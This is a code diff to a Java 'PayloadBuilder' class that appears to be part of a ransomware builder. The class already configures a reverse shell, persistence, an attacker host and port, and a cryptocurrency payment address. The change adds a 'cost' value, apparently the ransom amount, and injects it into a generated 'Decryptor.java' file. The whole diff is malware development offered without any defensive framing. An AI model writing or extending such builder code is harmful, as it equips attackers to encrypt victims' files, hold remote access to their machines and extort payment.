@@ -18,6 +18,7 @@ public class PayloadBuilder {
     private boolean useRevShell;
     private boolean usePersistence;
     private int revPort;
+    private double cost = 1;
 
 
     public PayloadBuilder() {
@@ -27,13 +28,14 @@ public class PayloadBuilder {
         path = "";
     }
 
-    public PayloadBuilder(String path, String CryptAddress, boolean useRevShell, boolean usePersistence, String host, int port) {
+    public PayloadBuilder(String path, String CryptAddress, double cost, boolean useRevShell, boolean usePersistence, String host, int port) {
         this.useRevShell = useRevShell;
         this.usePersistence = usePersistence;
         this.path = path;
         IP = host;
         revPort = port;
         this.CryptAddress = CryptAddress;
+        this.cost = cost;
     }
 
 
@@ -86,7 +88,8 @@ public class PayloadBuilder {
             code = replaceLine(code, 50, "private int revPort = " + revPort + ";");
             code = replaceLine(code, 51, "private boolean usePersistence = " + usePersistence + ";");
             code = replaceLine(code, 52, "private String CryptAddress = \"" + CryptAddress + "\";");
-            code = replaceLine(code, 60, "private static String targetPath = \"" + path + "\";");
+            code = replaceLine(code, 53, "private double cost = " + cost + ";");
+            code = replaceLine(code, 61, "private static String targetPath = \"" + path + "\";");
             FileWriter writer = new FileWriter(getWorkingDir() + "Decryptor.java");
             writer.write(code);
             writer.close();
